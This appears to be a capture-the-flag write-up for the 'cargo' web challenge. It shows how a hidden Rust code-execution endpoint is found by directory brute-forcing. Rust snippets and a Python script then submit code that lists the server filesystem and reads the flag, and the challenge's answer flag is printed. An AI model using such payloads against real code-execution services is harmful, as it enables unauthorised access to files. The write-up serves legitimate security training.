---
title: "cargo — CyberEdu / ROCSC CTF"
description: "Remote Code Execution via a hidden Rust code execution endpoint discovered through directory brute-forcing."
pubDate: 2025-03-12
tags: ["web", "rce", "rust", "cyberedu"]
---

**Category:** Web / RCE
**Flag:** `CTF{c7d604ecd0da6804f45d958b4c5fb622488250bd05c29b99d0134f3bfdda2fc4}`

## Challenge

The web app is in "maintenance" mode — the front page shows nothing useful.

## Step 1 — Find the hidden endpoint

Running Dirbuster against the app reveals `/editor` — a Rust code execution playground.

## Step 2 — Confirm execution

Send a POST to `/editor` with `codename=a`. The server response reveals it compiles and runs Rust code.

## Step 3 — Read the filesystem

List the root directory using `fs::read_dir`:

```rust
use std::fs;

fn main() {
    let paths = fs::read_dir("/").unwrap();
    for path in paths {
        println!("{}", path.unwrap().path().display());
    }
}
```

Found a directory named `flag39283761` containing a file `flag2781263`.

## Step 4 — Read the flag

```rust
use std::fs;

fn main() {
    let contents = fs::read_to_string("/flag39283761/flag2781263")
        .expect("Unable to read file");
    println!("{}", contents);
}
```

## Automated script

```python
import requests
import re

url = "http://34.107.71.117:32677/editor"
payload = {
    "codename": 'use std::fs;\n\nfn main() {\n    let contents = fs::read_to_string("/flag39283761/flag2781263").expect("Unable to read file");\n    println!("{}", contents);\n}'
}

r = requests.post(url, data=payload)
match = re.search(r'CTF\{[0-9a-fA-F]{64}\}', r.text)
if match:
    print(match.group())
```

## Takeaways

- Always run directory brute-forcing (`dirbuster`, `ffuf`, `gobuster`) on CTF targets.
- A code execution sandbox that accepts user-submitted code is an RCE by design.
- URL-encode payloads when sending them through web forms (use CyberChef or `urllib.parse`).
